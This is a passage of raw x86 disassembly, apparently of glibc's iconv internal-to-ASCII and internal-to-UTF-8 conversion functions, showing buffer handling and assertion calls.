lea eax, [var_10h]
cmove eax, dword [var_48h]
test edi, edi
mov dword [var_48h], eax
je 0x8059410
mov ebx, dword [var_8h]
mov edi, dword [ebx + 0x14]
mov eax, dword [edi]
and eax, 7
je 0x8059410
mov ebx, dword [var_18h]
test ebx, ebx
jne 0x80598fc
xor ebx, ebx
mov dword [var_50h], 0
mov dword [var_20h_3], ecx
cmp dword [var_18h], eax
mov dword [var_1ch_3], edx
jae 0x80593d2
lea edx, [var_18h_2]
movzx eax, byte [ebx + edi + 4]
mov byte [ebx + edx], al
mov eax, dword [edi]
inc ebx
and eax, 7
cmp ebx, eax
jb 0x80593c0
mov ecx, dword [var_20h_3]
mov eax, ecx
sub eax, ebx
add eax, 4
cmp eax, dword [var_14h]
ja 0x80598d0
mov eax, dword [var_44h]
cmp dword [var_1ch_3], eax
jb 0x805971a
mov eax, 5
test eax, eax
mov dword [var_3ch], eax
jne 0x805954b
mov ebx, dword [var_8h]
mov eax, dword [var_ch]
mov ebx, dword [ebx + 8]
mov esi, dword [eax]
mov dword [var_58h], ebx
nop
cmp esi, dword [var_14h]
mov edi, dword [var_14h_2]
mov dword [var_54h], 4
mov dword [var_28h], esi
mov eax, esi
mov dword [var_24h_3], edi
je 0x8059712
mov ecx, edi
lea esi, [esi]
lea ebx, [eax + 4]
cmp ebx, dword [var_14h]
ja 0x8059706
cmp ecx, dword [var_44h]
jae 0x80596fa
mov edx, dword [eax]
cmp edx, 0x7f
ja 0x805963f
movzx eax, byte [eax]
mov byte [ecx], al
mov eax, dword [var_28h]
mov ecx, dword [var_24h_3]
inc ecx
mov dword [var_24h_3], ecx
add eax, 4
mov dword [var_28h], eax
cmp eax, dword [var_14h]
jne 0x8059430
lea esi, [esi]
mov edx, dword [var_ch]
mov ebx, dword [var_54h]
mov dword [edx], eax
mov dword [var_3ch], ebx
mov dword [var_14h_2], ecx
mov eax, dword [var_18h]
test eax, eax
jne 0x8059633
mov eax, dword [var_8h]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x80594a5
mov eax, dword [ebx + 4]
test eax, eax
jne 0x8059605
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8059493
mov ebx, dword [var_8h]
inc dword [ebx + 0xc]
test byte [ebx + 8], 1
jne 0x80595f0
cmp dword [var_14h_2], edi
jbe 0x8059522
mov eax, dword [ebx]
mov dword [var_2ch], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h_2]
mov edx, dword [var_24h_2]
mov dword [var_sp_18h], 0
mov ebx, dword [var_1ch_2]
mov dword [var_sp_10h], 0
mov dword [var_ch_2], eax
mov dword [var_sp_1ch], edx
lea eax, [var_2ch]
mov dword [var_8h_2], eax
mov edx, dword [var_30h]
mov dword [var_sp_14h], ebx
mov eax, dword [var_34h]
mov dword [esp], edx
mov dword [var_4h_2], eax
call dword [var_38h]
cmp eax, 4
mov ecx, eax
je 0x80595d2
mov edx, dword [var_2ch]
mov eax, dword [var_14h_2]
cmp edx, eax
jne 0x80595c3
mov dword [var_3ch], ecx
mov eax, dword [var_3ch]
test eax, eax
jne 0x8059541
mov ebx, dword [var_8h]
mov edx, dword [var_ch]
mov eax, dword [ebx]
mov dword [var_14h_2], eax
mov esi, dword [edx]
mov eax, dword [ebx + 8]
mov dword [var_58h], eax
jmp 0x8059410
mov edi, dword [var_24h_2]
test edi, edi
jne 0x8059553
mov eax, dword [var_3ch]
add esp, 0x6c
pop ebx
pop esi
pop edi
leave
ret
cmp dword [var_3ch], 7
jne 0x8059548
mov ebx, dword [var_ch]
mov eax, dword [var_14h]
mov esi, dword [ebx]
sub eax, esi
cmp eax, 3
jg 0x805959f
xor ecx, ecx
cmp esi, dword [var_14h]
jae 0x805958e
mov eax, dword [var_8h]
mov ebx, dword [var_ch]
mov edx, dword [eax + 0x14]
lea eax, [esi + 1]
mov dword [ebx], eax
movzx eax, byte [esi]
mov byte [ecx + edx + 4], al
mov eax, dword [ebx]
inc ecx
cmp eax, dword [var_14h]
mov esi, eax
jb 0x805956f
mov eax, dword [var_8h]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ecx
mov dword [edx], eax
jmp 0x8059548
mov dword [var_ch_2], str.__gconv_transform_internal_ascii
mov dword [var_8h_2], 0x313
mov dword [var_4h_2], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
mov ebx, dword [var_ch]
sub eax, edx
shl eax, 2
sub dword [ebx], eax
jmp 0x805951f
cmp dword [var_54h], 5
jne 0x8059522
mov edx, dword [var_8h]
mov dword [var_3ch], 0
mov eax, dword [edx]
mov dword [var_14h_2], eax
jmp 0x8059522
mov eax, dword [var_14h_2]
mov ebx, dword [var_8h]
mov edx, dword [var_1ch_2]
mov dword [ebx], eax
mov eax, dword [var_10h]
add dword [edx], eax
jmp 0x8059541
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h_2]
mov edx, dword [var_ch]
mov dword [var_ch_2], edi
mov dword [var_sp_10h], eax
mov eax, dword [edx]
mov dword [var_4h_2], esi
mov dword [var_8h_2], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x805949e
mov edx, dword [var_18h]
mov eax, ebx
mov dword [edx], ecx
jmp 0x805954b
shr edx, 7
cmp edx, 0x1c00
je 0x80596f3
mov ebx, dword [var_48h]
mov dword [var_54h], 6
test ebx, ebx
je 0x8059470
mov edx, dword [var_8h]
mov ebx, dword [edx + 0x20]
test ebx, ebx
je 0x80596d4
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_48h]
lea edx, [var_24h_3]
mov dword [var_sp_18h], edx
lea edx, [var_28h]
mov dword [var_sp_10h], edx
mov edx, dword [var_ch]
mov dword [var_sp_1ch], eax
mov eax, dword [var_14h]
mov dword [var_sp_14h], eax
mov eax, dword [edx]
mov edx, dword [var_4h]
mov dword [var_ch_2], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], edx
mov dword [var_8h_2], eax
mov eax, dword [var_8h]
mov dword [var_4h_2], eax
call dword [ebx]
cmp eax, 6
mov dword [var_54h], eax
jne 0x80596c4
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8059670
cmp dword [var_54h], 6
mov eax, dword [var_28h]
mov ecx, dword [var_24h_3]
jne 0x8059465
mov edx, dword [var_48h]
test edx, edx
je 0x8059470
test byte [var_58h], 2
je 0x8059470
mov ebx, dword [var_48h]
inc dword [ebx]
jmp 0x805945f
mov eax, ebx
jmp 0x8059462
mov dword [var_54h], 5
jmp 0x8059470
mov dword [var_54h], 7
jmp 0x8059470
mov ecx, dword [var_24h_3]
jmp 0x8059470
lea edx, [var_18h_2]
mov eax, ecx
inc ecx
mov dword [var_20h_3], ecx
movzx eax, byte [eax]
mov byte [edx + ebx], al
inc ebx
cmp ebx, 3
ja 0x8059737
mov ecx, dword [var_20h_3]
cmp ecx, dword [var_14h]
jb 0x805971d
mov eax, dword [var_18h_2]
mov ecx, edx
mov dword [var_20h_3], edx
lea edx, [edx + ebx]
mov dword [var_4ch], edx
cmp eax, 0x7f
ja 0x805981e
movzx edx, byte [var_18h_2]
mov eax, dword [var_1ch_3]
mov byte [eax], dl
mov ecx, dword [var_20h_3]
inc dword [var_1ch_3]
add ecx, 4
mov dword [var_20h_3], ecx
lea edx, [var_18h_2]
cmp ecx, edx
je 0x80597be
mov eax, ecx
mov ecx, dword [edi]
sub eax, edx
mov edx, ecx
and edx, 7
cmp eax, edx
jle 0x805979a
sub eax, edx
and ecx, 0xfffffff8
mov dword [var_50h], 0
mov edx, dword [var_ch]
mov dword [edi], ecx
add dword [edx], eax
mov eax, dword [var_1ch_3]
mov dword [var_14h_2], eax
mov eax, dword [var_50h]
jmp 0x80593f6
mov dword [var_ch_2], str.internal_ascii_loop_single
mov dword [var_8h_2], 0x1a9
mov dword [var_4h_2], str..._iconv_loop.c
mov dword [esp], str.inptr___bytebuf____state____count__7_
jmp 0x80595be
cmp dword [var_50h], 7
jne 0x8059792
lea eax, [ecx + 4]
cmp dword [var_4ch], eax
je 0x80597fa
mov eax, dword [var_4ch]
mov edx, dword [edi]
sub eax, ecx
and edx, 7
sub eax, edx
mov edx, dword [var_ch]
add dword [edx], eax
cmp ecx, dword [var_4ch]
jae 0x8059792
mov eax, ecx
inc ecx
mov dword [var_20h_3], ecx
movzx eax, byte [eax]
mov byte [edi + ebx + 4], al
mov ecx, dword [var_20h_3]
inc ebx
cmp ecx, dword [var_4ch]
jb 0x80597e2
jmp 0x8059792
mov dword [var_ch_2], str.internal_ascii_loop_single
mov dword [var_8h_2], 0x1bb
mov dword [var_4h_2], str..._iconv_loop.c
mov dword [esp], str.inend___bytebuf_4_
jmp 0x80595be
shr eax, 7
cmp eax, 0x1c00
je 0x80598c8
mov eax, dword [var_48h]
mov dword [var_50h], 6
test eax, eax
je 0x8059763
mov eax, dword [var_8h]
mov esi, dword [eax + 0x20]
test esi, esi
je 0x80598a9
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_48h]
lea eax, [var_1ch_3]
mov dword [var_sp_18h], eax
lea eax, [var_20h_3]
mov dword [var_sp_10h], eax
mov dword [var_sp_1ch], edx
mov edx, dword [var_4ch]
mov dword [var_sp_14h], edx
mov edx, dword [var_ch]
mov eax, dword [edx]
mov edx, dword [var_4h]
mov dword [var_ch_2], eax
mov eax, dword [esi + 0xc]
mov dword [esp], edx
mov dword [var_8h_2], eax
mov eax, dword [var_8h]
mov dword [var_4h_2], eax
call dword [esi]
cmp eax, 6
mov dword [var_50h], eax
jne 0x805989c
mov esi, dword [esi + 0x10]
test esi, esi
jne 0x8059848
cmp dword [var_50h], 6
mov ecx, dword [var_20h_3]
jne 0x8059763
mov esi, dword [var_48h]
test esi, esi
je 0x8059763
test byte [var_40h], 2
je 0x8059763
mov eax, dword [var_48h]
inc dword [eax]
jmp 0x805975d
lea ecx, [var_14h_2]
jmp 0x8059760
mov edx, dword [var_14h]
mov eax, dword [var_ch]
cmp ecx, edx
mov dword [eax], edx
jae 0x80598f2
mov eax, ecx
inc ecx
mov dword [var_20h_3], ecx
movzx eax, byte [eax]
mov byte [edi + ebx + 4], al
mov ecx, dword [var_20h_3]
inc ebx
cmp ecx, dword [var_14h]
jb 0x80598dc
mov eax, 7
jmp 0x80593f6
mov dword [var_ch_2], str.__gconv_transform_internal_ascii
mov dword [var_8h_2], 0x22e
mov dword [var_4h_2], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x80595be
mov ebx, dword [var_18h]
mov edx, dword [ebx]
jmp 0x805935d
mov eax, dword [var_18h]
test eax, eax
jne 0x80599a2
mov edx, dword [var_8h]
mov dword [var_3ch], 0
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x8059548
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_24h_2]
mov dword [var_sp_18h], ebx
mov eax, dword [var_34h]
mov ebx, dword [var_1ch_2]
mov dword [var_sp_10h], 0
mov dword [var_ch_2], 0
mov dword [var_8h_2], 0
mov dword [var_sp_1ch], edx
mov dword [var_4h_2], eax
mov edx, dword [var_30h]
mov dword [var_sp_14h], ebx
mov dword [esp], edx
call dword [var_38h]
mov dword [var_3ch], eax
jmp 0x8059548
mov dword [var_ch_2], str.__gconv_transform_internal_ascii
mov dword [var_8h_2], 0x19f
jmp 0x805990c
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x94
mov dword [var_40h], 0
mov ecx, dword [arg_ch]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ebx, dword [arg_20h]
mov ecx, dword [ecx + 8]
add eax, 0x3c
add edx, 0x24
mov dword [var_38h], eax
mov dword [var_3ch], edx
mov dword [var_74h], ecx
mov dword [var_44h], ecx
and ecx, 1
jne 0x80599ff
mov eax, dword [eax + 0x14]
mov dword [var_40h], eax
test ebx, ebx
jne 0x805a2d5
mov eax, dword [arg_10h]
mov eax, dword [eax]
mov dword [var_78h], eax
mov ecx, eax
mov eax, dword [arg_18h]
test eax, eax
jne 0x805a2cb
mov ebx, dword [arg_ch]
mov edx, dword [ebx]
mov edi, dword [arg_1ch]
mov ebx, dword [arg_ch]
mov dword [var_50h], 0
lea eax, [var_bp_10h]
mov esi, dword [arg_24h]
mov dword [var_14h], edx
mov dword [var_bp_10h], 0
test edi, edi
mov ebx, dword [ebx + 4]
cmove eax, dword [var_50h]
test esi, esi
mov dword [var_48h], ebx
mov dword [var_50h], eax
je 0x8059ad6
mov eax, dword [arg_ch]
mov edi, dword [eax + 0x14]
mov eax, dword [edi]
and eax, 7
je 0x8059ad6
mov ebx, dword [arg_18h]
test ebx, ebx
jne 0x805a2a7
xor ebx, ebx
mov dword [var_58h], 0
mov dword [var_20h], ecx
cmp dword [arg_18h], eax
mov dword [var_bp_1ch], edx
jae 0x8059a96
lea edx, [var_bp_18h]
movzx eax, byte [ebx + edi + 4]
mov byte [ebx + edx], al
mov eax, dword [edi]
inc ebx
and eax, 7
cmp ebx, eax
jb 0x8059a84
mov edx, dword [var_20h]
mov eax, edx
mov dword [var_80h], edx
sub eax, ebx
add eax, 4
cmp eax, dword [arg_14h]
ja 0x805a270
mov edx, dword [var_48h]
cmp dword [var_bp_1ch], edx
jb 0x805a02a
mov eax, 5
test eax, eax
jne 0x8059c07
mov ebx, dword [arg_ch]
mov ebx, dword [ebx + 8]
mov eax, dword [arg_10h]
mov dword [var_74h], ebx
mov eax, dword [eax]
mov dword [var_78h], eax
mov ecx, dword [var_78h]
mov ebx, dword [arg_14h]
mov dword [var_60h], 4
mov edx, dword [var_14h]
cmp ecx, ebx
mov dword [var_28h], ecx
mov esi, ecx
mov dword [var_4ch], edx
mov dword [var_24h], edx
je 0x805a022
mov edi, edx
nop
lea esi, [esi]
lea eax, [esi + 4]
cmp eax, dword [arg_14h]
ja 0x805a016
cmp edi, dword [var_48h]
jae 0x8059f65
mov edx, dword [esi]
cmp edx, 0x7f
ja 0x8059f00
mov byte [edi], dl
inc dword [var_24h]
mov esi, dword [var_28h]
mov edi, dword [var_24h]
add esi, 4
mov dword [var_28h], esi
cmp esi, dword [arg_14h]
jne 0x8059b00
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov esi, dword [var_60h]
mov dword [var_14h], edi
mov edx, dword [arg_18h]
test edx, edx
jne 0x8059ef6
mov eax, dword [arg_ch]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x8059b68
mov eax, dword [ebx + 4]
test eax, eax
jne 0x8059ec2
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8059b56
mov edx, dword [arg_ch]
inc dword [edx + 0xc]
test byte [edx + 8], 1
jne 0x8059ead
mov ecx, dword [var_4ch]
cmp dword [var_14h], ecx
jbe 0x8059bea
mov eax, dword [edx]
mov ebx, dword [var_40h]
mov dword [var_2ch], eax
mov dword [esp], ebx
call fcn.08083520
mov eax, dword [arg_24h]
mov edx, dword [arg_1ch]
mov dword [var_18h], 0
mov ecx, dword [var_3ch]
mov ebx, dword [var_38h]
mov dword [var_10h], 0
mov dword [var_1ch], eax
mov dword [var_sp_14h], edx
mov eax, dword [var_14h]
mov dword [var_4h], ecx
mov dword [esp], ebx
mov dword [var_ch], eax
lea eax, [var_2ch]
mov dword [var_8h], eax
call dword [var_40h]
cmp eax, 4
mov dword [var_64h], eax
je 0x8059e94
mov eax, dword [var_2ch]
cmp eax, dword [var_14h]
mov dword [var_68h], eax
jne 0x8059c91
mov esi, dword [var_64h]
test esi, esi
jne 0x8059bfe
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
mov ebx, dword [ecx + 8]
mov dword [var_14h], eax
jmp 0x8059acb
mov eax, dword [arg_24h]
test eax, eax
jne 0x8059c12
mov eax, esi
add esp, 0x94
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x8059c05
mov edx, dword [arg_10h]
mov eax, dword [arg_14h]
mov edx, dword [edx]
sub eax, edx
mov dword [var_78h], edx
cmp eax, 3
jg 0x8059c6d
xor ecx, ecx
mov ebx, dword [arg_14h]
cmp dword [var_78h], ebx
jae 0x8059c5c
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
mov edx, dword [eax + 0x14]
mov eax, dword [var_78h]
inc eax
mov dword [ebx], eax
mov ebx, dword [var_78h]
movzx eax, byte [ebx]
mov byte [ecx + edx + 4], al
mov ebx, dword [arg_14h]
mov edx, dword [arg_10h]
inc ecx
mov eax, dword [edx]
cmp eax, ebx
mov dword [var_78h], eax
jb 0x8059c33
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ecx
mov dword [edx], eax
jmp 0x8059c05
mov dword [var_ch], str.__gconv_transform_internal_utf8
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
mov ecx, dword [var_78h]
mov edx, dword [arg_10h]
mov dword [var_70h], 4
mov ebx, dword [var_4ch]
mov dword [edx], ecx
mov esi, ecx
cmp ecx, dword [arg_14h]
mov edx, dword [arg_ch]
mov dword [var_14h], ebx
mov dword [var_34h], ecx
mov dword [var_30h], ebx
mov edx, dword [edx + 8]
mov dword [var_6ch], edx
je 0x8059e8c
mov edi, ebx
lea eax, [esi + 4]
cmp eax, dword [arg_14h]
ja 0x8059e80
cmp edi, dword [var_68h]
jae 0x8059dce
mov edx, dword [esi]
cmp edx, 0x7f
ja 0x8059d69
mov byte [edi], dl
inc dword [var_30h]
mov esi, dword [var_34h]
mov edi, dword [var_30h]
add esi, 4
mov dword [var_34h], esi
cmp esi, dword [arg_14h]
jne 0x8059cc2
mov eax, dword [var_2ch]
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [var_14h], edi
cmp edi, eax
jne 0x8059d45
cmp dword [var_70h], 5
jne 0x8059d21
cmp edi, dword [var_4ch]
jne 0x8059be7
mov ebx, dword [arg_ch]
dec dword [ebx + 0xc]
jmp 0x8059be7
mov dword [var_ch], str.__gconv_transform_internal_utf8
mov dword [var_8h], 0x2e0
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.nstatus____GCONV_FULL_OUTPUT
jmp 0x8059c8c
mov dword [var_ch], str.__gconv_transform_internal_utf8
mov dword [var_8h], 0x2df
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbuf__outerr
jmp 0x8059c8c
test edx, edx
js 0x8059dda
mov dword [var_80h], 2
mov ebx, 0xb
mov eax, 0xffffffff
mov ecx, ebx
shl eax, cl
test eax, edx
je 0x8059d92
inc dword [var_80h]
add ebx, 5
cmp dword [var_80h], 5
jbe 0x8059d79
mov ecx, dword [var_80h]
mov ebx, edi
lea eax, [ecx + edi]
cmp eax, dword [var_68h]
ja 0x8059dce
mov eax, 0xffffff00
sar eax, cl
mov byte [edi], al
mov eax, dword [var_80h]
add dword [var_30h], eax
dec dword [var_80h]
mov eax, edx
shr edx, 6
mov ecx, dword [var_80h]
and eax, 0x3f
or eax, 0xffffff80
cmp ecx, 1
mov byte [ecx + ebx], al
ja 0x8059dae
or byte [ebx], dl
jmp 0x8059ce7
mov dword [var_70h], 5
jmp 0x8059cf8
mov eax, dword [var_50h]
mov dword [var_70h], 6
test eax, eax
je 0x8059cf8
mov eax, dword [arg_ch]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x8059e5a
lea edi, [var_30h]
lea esi, [var_34h]
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_50h]
mov ecx, dword [arg_14h]
mov dword [var_18h], edi
mov dword [var_10h], esi
mov dword [var_1ch], edx
mov dword [var_sp_14h], ecx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_ch], eax
mov eax, dword [ebx + 0xc]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [ebx]
cmp eax, 6
mov dword [var_70h], eax
jne 0x8059e4a
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8059dfc
cmp dword [var_70h], 6
mov esi, dword [var_34h]
mov edi, dword [var_30h]
jne 0x8059cf3
mov eax, dword [var_50h]
test eax, eax
je 0x8059cf8
test byte [var_6ch], 2
je 0x8059cf8
mov edx, dword [var_50h]
add esi, 4
mov dword [var_34h], esi
inc dword [edx]
jmp 0x8059cf3
nop
mov dword [var_70h], 7
jmp 0x8059cf8
mov edi, dword [var_30h]
jmp 0x8059cfb
cmp dword [var_60h], 5
jne 0x8059bea
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_14h], eax
jmp 0x8059bea
mov eax, dword [var_14h]
mov edx, dword [arg_ch]
mov ecx, dword [arg_1ch]
mov dword [edx], eax
mov eax, dword [var_bp_10h]
add dword [ecx], eax
jmp 0x8059bfe
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h]
mov edx, dword [var_4ch]
mov ecx, dword [arg_10h]
mov dword [var_10h], eax
mov dword [var_ch], edx
mov eax, dword [ecx]
mov dword [var_8h], eax
mov eax, dword [var_78h]
mov dword [var_4h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x8059b61
mov ebx, dword [arg_18h]
mov dword [ebx], edi
jmp 0x8059c05
test edx, edx
js 0x8059f71
mov dword [var_80h], 2
mov ebx, 0xb
mov eax, 0xffffffff
mov ecx, ebx
shl eax, cl
test eax, edx
je 0x8059f29
inc dword [var_80h]
add ebx, 5
cmp dword [var_80h], 5
jbe 0x8059f10
mov ecx, dword [var_80h]
mov ebx, edi
lea eax, [ecx + edi]
cmp eax, dword [var_48h]
ja 0x8059f65
mov eax, 0xffffff00
sar eax, cl
mov byte [edi], al
mov eax, dword [var_80h]
add dword [var_24h], eax
dec dword [var_80h]
mov eax, edx
shr edx, 6
mov ecx, dword [var_80h]
and eax, 0x3f
or eax, 0xffffff80
cmp ecx, 1
mov byte [ecx + ebx], al
ja 0x8059f45
or byte [ebx], dl
jmp 0x8059b25
mov dword [var_60h], 5
jmp 0x8059b36
mov ebx, dword [var_50h]
mov dword [var_60h], 6
test ebx, ebx
je 0x8059b36
mov eax, dword [arg_ch]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x8059ff1
lea edi, [var_24h]
lea esi, [var_28h]
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_50h]
mov ecx, dword [arg_14h]
mov dword [var_18h], edi
mov dword [var_10h], esi
mov dword [var_1ch], edx
mov dword [var_sp_14h], ecx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_ch], eax
mov eax, dword [ebx + 0xc]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [ebx]
cmp eax, 6
mov dword [var_60h], eax
jne 0x8059fe1
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8059f93
cmp dword [var_60h], 6
mov esi, dword [var_28h]
mov edi, dword [var_24h]
jne 0x8059b31
mov ecx, dword [var_50h]
test ecx, ecx
je 0x8059b36
test byte [var_74h], 2
je 0x8059b36
mov edx, dword [var_50h]
add esi, 4
mov dword [var_28h], esi
inc dword [edx]
jmp 0x8059b31
mov dword [var_60h], 7
jmp 0x8059b36
mov edi, dword [var_24h]
jmp 0x8059b36
lea edx, [var_bp_18h]
mov eax, dword [var_80h]
inc dword [var_80h]
mov ecx, dword [var_80h]
mov dword [var_20h], ecx
movzx eax, byte [eax]
mov byte [edx + ebx], al
inc ebx
cmp ebx, 3
ja 0x805a052
mov eax, dword [var_20h]
mov ecx, dword [arg_14h]
cmp eax, ecx
mov dword [var_80h], eax
jb 0x805a02d
mov eax, edx
mov dword [var_80h], edx
mov dword [var_20h], edx
mov edx, dword [var_bp_18h]
add eax, ebx
mov dword [var_54h], eax
cmp edx, 0x7f
ja 0x805a14e
mov eax, dword [var_bp_1ch]
mov byte [eax], dl
inc dword [var_bp_1ch]
mov eax, dword [var_20h]
add eax, 4
mov dword [var_80h], eax
mov dword [var_20h], eax
lea edx, [var_bp_18h]
cmp dword [var_80h], edx
je 0x805a0dc
mov eax, dword [var_80h]
mov ecx, dword [edi]
sub eax, edx
mov edx, ecx
and edx, 7
cmp eax, edx
jle 0x805a0b8
mov ebx, dword [arg_10h]
sub eax, edx
and ecx, 0xfffffff8
mov dword [var_58h], 0
mov dword [edi], ecx
add dword [ebx], eax
mov eax, dword [var_bp_1ch]
mov dword [var_14h], eax
mov eax, dword [var_58h]
jmp 0x8059abd
mov dword [var_ch], str.internal_utf8_loop_single
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inptr___bytebuf____state____count__7_
jmp 0x8059c8c
cmp dword [var_58h], 7
jne 0x805a0b0
mov eax, dword [var_80h]
add eax, 4
cmp dword [var_54h], eax
je 0x805a12a
mov eax, dword [var_54h]
mov edx, dword [edi]
sub eax, dword [var_80h]
mov ecx, dword [var_54h]
and edx, 7
sub eax, edx
mov edx, dword [arg_10h]
add dword [edx], eax
cmp dword [var_80h], ecx
jae 0x805a0b0
mov eax, dword [var_80h]
inc dword [var_80h]
mov edx, dword [var_80h]
mov dword [var_20h], edx
movzx eax, byte [eax]
mov byte [edi + ebx + 4], al
mov eax, dword [var_54h]
mov ecx, dword [var_20h]
inc ebx
cmp ecx, eax
mov dword [var_80h], ecx
jb 0x805a107
jmp 0x805a0b0
mov dword [var_ch], str.internal_utf8_loop_single
mov dword [var_8h], 0x1bb
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inend___bytebuf_4_
jmp 0x8059c8c
test edx, edx
js 0x805a1bf
mov esi, 2
mov dword [var_7ch], 0xb
movzx ecx, byte [var_7ch]
mov eax, 0xffffffff
shl eax, cl
test eax, edx
je 0x805a177
inc esi
add dword [var_7ch], 5
cmp esi, 5
jbe 0x805a15e
mov eax, dword [var_bp_1ch]
mov dword [var_5ch], eax
add eax, esi
cmp eax, dword [var_48h]
ja 0x805a1b3
mov ecx, esi
mov eax, 0xffffff00
sar eax, cl
mov ecx, dword [var_5ch]
mov byte [ecx], al
add dword [var_bp_1ch], esi
mov eax, edx
mov ecx, dword [var_5ch]
dec esi
and eax, 0x3f
shr edx, 6
or eax, 0xffffff80
cmp esi, 1
mov byte [esi + ecx], al
ja 0x805a195
or byte [ecx], dl
jmp 0x805a073
mov dword [var_58h], 5
jmp 0x805a07f
mov eax, dword [var_50h]
mov dword [var_58h], 6
test eax, eax
je 0x805a07f
mov eax, dword [arg_ch]
mov esi, dword [eax + 0x20]
test esi, esi
je 0x805a23f
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_50h]
lea ecx, [var_bp_1ch]
mov eax, dword [var_54h]
mov dword [var_18h], ecx
mov ecx, dword [arg_10h]
mov dword [var_1ch], edx
mov dword [var_sp_14h], eax
lea edx, [var_20h]
mov dword [var_10h], edx
mov edx, dword [arg_8h]
mov eax, dword [ecx]
mov dword [var_ch], eax
mov eax, dword [esi + 0xc]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call dword [esi]
cmp eax, 6
mov dword [var_58h], eax
jne 0x805a268
mov esi, dword [esi + 0x10]
test esi, esi
jne 0x805a1db
mov ecx, dword [var_20h]
mov dword [var_80h], ecx
cmp dword [var_58h], 6
jne 0x805a07f
mov esi, dword [var_50h]
test esi, esi
je 0x805a07f
test byte [var_44h], 2
je 0x805a07f
mov edx, dword [var_50h]
add dword [var_80h], 4
mov ecx, dword [var_80h]
inc dword [edx]
mov dword [var_20h], ecx
jmp 0x805a07f
mov eax, dword [var_20h]
mov dword [var_80h], eax
jmp 0x805a235
mov eax, dword [arg_14h]
mov ecx, dword [arg_10h]
cmp edx, eax
mov dword [ecx], eax
jae 0x805a29d
mov eax, dword [var_80h]
inc dword [var_80h]
mov edx, dword [var_80h]
mov dword [var_20h], edx
movzx eax, byte [eax]
mov byte [edi + ebx + 4], al
mov eax, dword [arg_14h]
mov ecx, dword [var_20h]
inc ebx
cmp ecx, eax
mov dword [var_80h], ecx
jb 0x805a27c
mov eax, 7
jmp 0x8059abd
mov dword [var_ch], str.__gconv_transform_internal_utf8
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x8059c8c
mov eax, dword [arg_18h]
mov edx, dword [eax]
jmp 0x8059a21
mov eax, dword [arg_18h]
test eax, eax
jne 0x805a347
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x8059c05
mov ecx, dword [var_40h]
mov dword [esp], ecx
call fcn.08083520
mov eax, dword [arg_24h]
mov dword [var_18h], ebx
mov edx, dword [arg_1ch]
mov ecx, dword [var_3ch]
mov ebx, dword [var_38h]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_1ch], eax
mov dword [var_sp_14h], edx
mov dword [var_4h], ecx
mov dword [esp], ebx
call dword [var_40h]
mov esi, eax
jmp 0x8059c05
mov dword [var_ch], str.__gconv_transform_internal_utf8
mov dword [var_8h], 0x19f
jmp 0x805a2b7
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xb0
mov dword [var_38h], 0
mov ecx, dword [arg_ch]
